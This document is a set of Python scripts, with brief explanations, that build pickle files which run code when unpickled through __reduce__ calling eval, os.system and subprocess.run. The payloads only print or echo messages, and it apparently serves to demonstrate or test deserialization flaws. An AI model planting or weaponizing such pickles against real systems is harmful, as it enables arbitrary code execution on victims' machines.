```python
# create_malicious_pickle.py
import pickle

# Define a class with potentially malicious behavior
class MaliciousCode:
    def __reduce__(self):
        # Code to execute upon unpickling
        return (eval, ("print('Malicious Code Executed')",))

# Create an instance of the malicious class
malicious_data = MaliciousCode()

# Serialize the malicious object
with open('malicious.pkl', 'wb') as f:
    pickle.dump(malicious_data, f)

print("Malicious pickle file 'malicious.pkl' created.")

```

### Vulnerability 1: Arbitrary Code Execution using `os.system`

This example demonstrates how a pickle file can be crafted to execute a system command when unpickled. In this case, it will run `echo 'os.system command executed'`.

```python
import pickle
import os

class OSCommand:
    def __reduce__(self):
        return (os.system, ('echo "os.system command executed"',))

with open('os_system_vuln.pkl', 'wb') as f:
    pickle.dump(OSCommand(), f)

print("Malicious pickle file 'os_system_vuln.pkl' created.")
```

### Vulnerability 2: Arbitrary Code Execution using `subprocess.run`

Similar to `os.system`, this example uses the `subprocess` module to execute a command. This is another common vector for arbitrary code execution.

```python
import pickle
import subprocess

class SubprocessCommand:
    def __reduce__(self):
        # Execute a simple command, e.g., 'ls -l'
        return (subprocess.run, (['echo', 'subprocess.run command executed'],))

with open('subprocess_vuln.pkl', 'wb') as f:
    pickle.dump(SubprocessCommand(), f)

print("Malicious pickle file 'subprocess_vuln.pkl' created.")
```

### Vulnerability 3: Using `eval` with a different message

This is similar to the `malicious.pkl` you already created, but with a different string to be evaluated, demonstrating another instance of `eval` misuse.

```python
import pickle

class EvalPayload:
    def __reduce__(self):
        return (eval, ("print('Another eval payload executed!')",))

with open('eval_vuln.pkl', 'wb') as f:
    pickle.dump(EvalPayload(), f)

print("Malicious pickle file 'eval_vuln.pkl' created.")
```
